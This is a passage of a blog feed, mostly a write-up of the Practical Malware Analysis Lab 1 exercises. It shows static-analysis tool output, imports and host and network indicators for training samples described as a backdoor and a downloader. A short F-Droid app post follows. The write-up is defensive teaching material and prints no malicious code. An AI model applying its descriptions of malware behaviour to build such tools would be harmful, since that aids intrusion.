&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ diec Lab01-01.dll
PE: compiler: Microsoft Visual C/C++&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;msvcrt&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: Microsoft Linker&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;DLL32&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
$ diec Lab01-01.exe
PE: compiler: Microsoft Visual C/C++&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;msvcrt&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: Microsoft Linker&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;DLL32&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the given file is packed, the &lt;code&gt;diec&lt;/code&gt; command would list the packer used in the output.&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;em&gt;Do any imports hint at what this malware does? If so, which imports are they?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;pev&lt;/code&gt; allows us to check the imported functions by using the &lt;code&gt;-i&lt;/code&gt; flag, for instance:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ readpe -i Lab01-01.dll
Imported functions
    Library
        Name:                            KERNEL32.dll
        Functions
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;662&lt;/span&gt;
                Name:                            Sleep
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;
                Name:                            CreateProcessA
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
                Name:                            CreateMutexA
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;493&lt;/span&gt;
                Name:                            OpenMutexA
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;
                Name:                            CloseHandle
    Library
        Name:                            WS2_32.dll
        Functions
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;
            Function
                Ordinal:                         &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
    Library
        Name:                            MSVCRT.dll
        Functions
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;157&lt;/span&gt;
                Name:                            _adjust_fdiv
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;657&lt;/span&gt;
                Name:                            malloc
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;271&lt;/span&gt;
                Name:                            _initterm
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;606&lt;/span&gt;
                Name:                            free
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;704&lt;/span&gt;
                Name:                            strncmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to make the blog post more readable, I&amp;rsquo;ll summarize the findings and list only the interesting functions.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lab01–01.exe imports functions from &lt;code&gt;KERNEL32.dll&lt;/code&gt; and &lt;code&gt;MSVCRT.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Lab01–01.dll imports functions from &lt;code&gt;KERNEL32.dll&lt;/code&gt;, &lt;code&gt;MSVCRT.dll&lt;/code&gt;, and &lt;code&gt;WS2_32.dll&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;KERNEL32.dll&lt;/code&gt; contains important functionalities (like access and edit memory and files), thus is a common DLL to import. It is interesting to note the presence of &lt;code&gt;FindFirstFileA&lt;/code&gt; and &lt;code&gt;FindNextFileA&lt;/code&gt; in Lab01–01.exe, and &lt;code&gt;CreateProcessA&lt;/code&gt; in Lab01–01.dll.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WS2_32.dll&lt;/code&gt; is used for network functionalities, but in this case is imported by ordinals, thus we don&amp;rsquo;t have many additional information.&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;em&gt;Are there any other files or host-based indicators that you could look for on infected systems?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Using &lt;code&gt;strings&lt;/code&gt; on Lab01-01.exe file, we can see some interesting findings, such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;kerne132.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kernel32.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\windows\system32\kerne132.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Kernel32.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Lab01-01.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\System32\Kernel32.dll&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WARNING_THIS_WILL_DESTROY_YOUR_MACHINE&lt;/code&gt; (my favorite)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In particular, we can assume the existence of the file named &lt;code&gt;kerne132.dll&lt;/code&gt; (with a &lt;em&gt;1&lt;/em&gt; instead of an &lt;em&gt;l&lt;/em&gt;) for infected machines.&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;em&gt;What network-based indicators could be used to find this malware on infected machines?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Using &lt;code&gt;strings&lt;/code&gt; on Lab01-01.dll, we can see an IP address: &lt;code&gt;127.26.152.13&lt;/code&gt;.&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;&lt;em&gt;What would you guess is the purpose of these files?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Other interesting results running &lt;code&gt;strings&lt;/code&gt; are: &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;hello&lt;/code&gt;, &lt;code&gt;CreateProcess&lt;/code&gt; and &lt;code&gt;sleep&lt;/code&gt;; which are names of functions. Based on the findings provided, we can say that these two files may be used to create a backdoor.&lt;/p&gt;
&lt;h2 id=&#34;lab-1-2&#34;&gt;Lab 1-2&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Upload the Lab01-02.exe file to VirusTotal. Does it match any existing antivirus definitions?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The file is considered malicious by 55 engines, &lt;a href=&#34;https://www.virustotal.com/gui/file/c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6/detection&#34;&gt;here is the report&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;em&gt;Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Detect It Easy finds that UPX has been used in this case:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ diec Lab01-02.exe
PE: packer: UPX&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.04&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;NRV,best&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: compiler: Microsoft Visual C/C++&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: Microsoft Linker&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;EXE32,console&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can then proceed to unpack the file with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ upx -d -o Lab01-02_unpacked.exe Lab01-02.exe

                       Ultimate Packer &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; eXecutables
                          Copyright &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;C&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1996&lt;/span&gt; - &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     &lt;span style=&#34;color:#ae81ff&#34;&gt;16384&lt;/span&gt; &amp;lt;-      &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt;   18.75%    win32/pe     Lab01-02_unpacked.exe

Unpacked &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; file.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;em&gt;Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;As shown in the previous exercise, we can use &lt;code&gt;readpe -i&lt;/code&gt; to check the imported functions. Here are the interesting findings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;KERNEL32.DLL&lt;/code&gt;: &lt;code&gt;SystemTimeToFileTime&lt;/code&gt;, &lt;code&gt;GetModuleFileNameA&lt;/code&gt;, &lt;code&gt;CreateMutexA&lt;/code&gt;, &lt;code&gt;CreateThread&lt;/code&gt; and &lt;code&gt;SetWaitableTimer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADVAPI32.DLL&lt;/code&gt;: &lt;code&gt;CreateServiceA&lt;/code&gt;, &lt;code&gt;StartServiceCtrlDispatcherA&lt;/code&gt; and &lt;code&gt;OpenSCManagerA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WININET.DLL&lt;/code&gt;: &lt;code&gt;InternetOpenUrlA&lt;/code&gt; and &lt;code&gt;InternetOpenA&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In particular, the last DLL file suggests that the file is communicating over the Internet.&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;em&gt;What host or network-based indicators could be used to identify this malware on infected machines?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Again, &lt;code&gt;strings&lt;/code&gt; is our friend: &lt;code&gt;MalService&lt;/code&gt;, &lt;code&gt;Malservice&lt;/code&gt;, &lt;code&gt;HGL345&lt;/code&gt;,&lt;code&gt;http://www.malwareanalysisbook.com&lt;/code&gt; and &lt;code&gt;Internet Explorer 8.0&lt;/code&gt;. These results are suggesting that the file is creating a service (probably &lt;code&gt;MalService&lt;/code&gt;?) and connecting to the URL.&lt;/p&gt;
&lt;h2 id=&#34;lab-1-3&#34;&gt;Lab 1-3&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Upload the Lab01-03.exe file to VirusTotal. Does it match any existing antivirus definitions?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Lab01-03.exe is detected as malicious by 64 engines, &lt;a href=&#34;https://www.virustotal.com/gui/file/7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec/detection&#34;&gt;here is the report&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;em&gt;Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Scanning the file with &lt;code&gt;diec&lt;/code&gt; shows that it is packed with FSG 1.0:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ diec Lab01-03.exe
PE: packer: FSG&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: unknown&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;EXE32,console&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unfortunately it is not possible (AFAIK) to unpack it with &lt;code&gt;upx&lt;/code&gt;, thus I cannot proceed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ upx -d Lab01-03.exe
                       Ultimate Packer &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; eXecutables
                          Copyright &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;C&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1996&lt;/span&gt; - &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: Lab01-03.exe: NotPackedException: not packed by UPX

Unpacked &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; files.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;em&gt;Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Being still packed, we have limited visibility on Lab01–03.exe. We can only see that it imports &lt;code&gt;KERNEL32.DLL&lt;/code&gt; and uses the following functions: &lt;code&gt;LoadLibraryA&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ readpe -i Lab01-03.exe
Imported functions
    Library
        Name:                            KERNEL32.dll
        Functions
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                Name:                            LoadLibraryA
            Function
                Hint:                            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                Name:                            GetProcAddress
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;em&gt;What host or network-based indicators could be used to identify this malware on infected machines?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In this case, &lt;code&gt;strings&lt;/code&gt; does not help us a lot, because the file is packed.
Again we see &lt;code&gt;LoadLibraryA&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt;. Some of the other strings seems to refer to &lt;a href=&#34;https://en.wikipedia.org/wiki/Object_Linking_and_Embedding&#34;&gt;OLE&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;lab-1-4&#34;&gt;Lab 1-4&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Upload the Lab01-04.exe file to VirusTotal. Does it match any existing antivirus definitions?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The file is detected as malicious by 61 engines, &lt;a href=&#34;https://www.virustotal.com/gui/file/0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126/detection&#34;&gt;here is the report&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;em&gt;Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The file does not seem to be packed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ diec Lab01-04.exe
PE: compiler: Microsoft Visual C/C++&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;msvcrt&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: Microsoft Linker&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0*&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;EXE32&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;em&gt;When was this program compiled?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The time stamp reported seems suspicious 🤔, considering that the book was published in 2012:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ readpe Lab01-04.exe | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time stamp&amp;#34;&lt;/span&gt;
    Date/time stamp:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;1567204019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Fri, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; 22:26:59 UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It was probably modified, thus it&amp;rsquo;s not clear when the file was actually compiled.&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;em&gt;Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are the imports found with &lt;code&gt;readpe -i&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ADVAPI32.dll&lt;/code&gt;: &lt;code&gt;AdjustTokenPrivileges&lt;/code&gt;, &lt;code&gt;LookupPrivilegeValueA&lt;/code&gt; and &lt;code&gt;OpenProcessToken&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;KERNEL32.dll&lt;/code&gt;: &lt;code&gt;CreateRemoteThread&lt;/code&gt;, &lt;code&gt;MoveFileA&lt;/code&gt;, &lt;code&gt;SizeofResource&lt;/code&gt;, &lt;code&gt;LoadResource&lt;/code&gt;, &lt;code&gt;GetModuleHandleA&lt;/code&gt;, &lt;code&gt;OpenProcess&lt;/code&gt;, &lt;code&gt;GetWindowsDirectoryA&lt;/code&gt;, &lt;code&gt;WriteFile&lt;/code&gt;, &lt;code&gt;GetCurrentProcess&lt;/code&gt;, &lt;code&gt; CreateFileA&lt;/code&gt;, &lt;code&gt;GetProcAddress&lt;/code&gt;, &lt;code&gt;FindResourceA&lt;/code&gt;, &lt;code&gt;LoadLibraryA&lt;/code&gt; and &lt;code&gt;WinExec&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Considering the functions used, we can say that the program will try to access protected files (&lt;code&gt;SizeOfResource&lt;/code&gt;, &lt;code&gt;FindResource&lt;/code&gt;, &lt;code&gt;LoadResource&lt;/code&gt;, &lt;code&gt;LookupPrivilegeValueA&lt;/code&gt; and &lt;code&gt;AdjustTokenPrivilages&lt;/code&gt;) and create and execute files (&lt;code&gt;CreateFile&lt;/code&gt;, &lt;code&gt;WriteFile&lt;/code&gt; and &lt;code&gt;WinExec&lt;/code&gt;).&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;em&gt;What host or network-based indicators could be used to identify this malware on infected machines?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are the host and network-based indicators that can be found using &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;host-based&lt;/strong&gt;: &lt;code&gt;C:\WINDOWS\system32\wupdmgrd.exe&lt;/code&gt; and &lt;code&gt;winup.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;network-based&lt;/strong&gt;: &lt;code&gt;http://www.practicalmalwareanalysis.com/updater.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;em&gt;This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We can list and extract the resources from a Windows binary using &lt;code&gt;wrestool&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ wrestool -l Lab01-04.exe
--type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BIN&amp;#39;&lt;/span&gt; --name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt; --language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1033&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;offset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x4060 size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;16384&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
$ wrestool -x --raw --output&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Lab01-04.bin Lab01-04.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/819b2db1876d85846811799664d512b2f1af13e329f5debe60926c3b03424745/detection&#34;&gt;VirusTotal report&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Not packed:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ diec Lab01-04.bin
PE: compiler: Microsoft Visual C/C++&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;msvcrt&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
PE: linker: Microsoft Linker&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.0&lt;span style=&#34;color:#f92672&#34;&gt;)[&lt;/span&gt;EXE32&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Compiled on &lt;code&gt;1298765819 (Sun, 27 Feb 2011 00:16:59 UTC)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Imports: &lt;code&gt;KERNEl32.dll&lt;/code&gt; (&lt;code&gt;WinExec&lt;/code&gt;) and &lt;code&gt;urlmon.dll&lt;/code&gt; (&lt;code&gt;URLDownloadToFileA&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Interesting strings: &lt;code&gt;\system32\wupdmgr.exe&lt;/code&gt;, &lt;code&gt;winup.exe&lt;/code&gt; and &lt;code&gt;www.malwareanalysisbok.com/updater.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Considering the information obtained, we can assume that the Lab01-04.exe file will be used to change permissions to write in a directory and drop and execute the hidden resource, which contacts the network to download and run additional malware.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>My F-Droid apps recommendations</title>
      <link>/posts/fdroid-apps/</link>
      <pubDate>Sun, 05 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/fdroid-apps/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/fdroid-apps/fdroid.png&#34; width=&#34;300&#34;/&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;what-is-f-droid&#34;&gt;What is F-Droid?&lt;/h2&gt;
&lt;p&gt;F-Droid is a community-maintained software repository for Android devices; or - to make it simpler - an alternative store for Android apps.
Similarly to the Google Play Store, F-Droid allows searching, installing and updating apps. What makes F-Droid different from the Google Play Store (and other alternative stores, such as Aptoide) is the fact that its entire list of applications is FOSS (&lt;em&gt;Free and Open Source Software&lt;/em&gt;), meaning that the source code of the apps is available online, and can be inspected by everyone.&lt;/p&gt;
&lt;h2 id=&#34;why-use-f-droid&#34;&gt;Why use F-Droid?&lt;/h2&gt;
&lt;p&gt;There are different advantages of using F-Droid. On the privacy side, F-Droid allows the user to download, install and update applications without being registered to the store. In addition, every app on F-Droid has to have the so-called ‘&lt;em&gt;anti-features&lt;/em&gt;’:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No user tracking systems;&lt;/li&gt;
&lt;li&gt;No advertising;&lt;/li&gt;
&lt;li&gt;No dependence on non-free software: everyone can download, run, and use all the features of the application&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On the security side, its open-source license allows everyone to check the source code of every app before downloading it. In addition, F-Droid sends all the information over HTTPS by default, and, if &lt;a href=&#34;https://guardianproject.info/apps/orbot/&#34;&gt;Orbot&lt;/a&gt; is installed on the device, it can even force the traffic to go through Tor.&lt;/p&gt;
